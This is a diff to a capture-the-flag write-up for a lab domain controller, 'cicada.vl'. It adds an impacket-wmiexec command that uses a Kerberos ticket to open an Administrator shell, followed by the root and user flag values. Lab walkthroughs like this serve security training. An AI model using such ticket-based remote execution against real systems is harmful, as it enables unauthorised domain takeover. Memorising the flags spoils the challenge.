@@ -610,13 +610,46 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in Administrator.ccache
 
 ```
+
+```
+impacket-wmiexec -k -no-pass -dc-ip 10.129.150.101 cicada.vl/Administrator@DC-JPQ225.cicada.vl
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+cicada\administrator
+
+```
+
 ---
 ## User Flag
 
-### Lateral Movement (if applicable)
+```
+C:\users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is D614-4931
 
-Steps to move from initial foothold to user access.
+ Directory of C:\users\Administrator\Desktop
 
+04/10/2025  11:00 PM    <DIR>          .
+09/13/2024  09:10 AM    <DIR>          ..
+09/15/2024  06:26 AM             2,304 Microsoft Edge.lnk
+09/29/2026  08:25 AM                34 root.txt
+09/29/2026  08:25 AM                34 user.txt
+               3 File(s)          2,372 bytes
+               2 Dir(s)   3,440,087,040 bytes free
+
+C:\users\Administrator\Desktop>type root.txt
+31a880eaf25d8971361cfb428202ed01
+
+C:\users\Administrator\Desktop>type user.txt
+6877173beaeffe805a33b07f91b05eaf
+
+C:\users\Administrator\Desktop>
+
+```
 ---
 ## Privilege Escalation
 
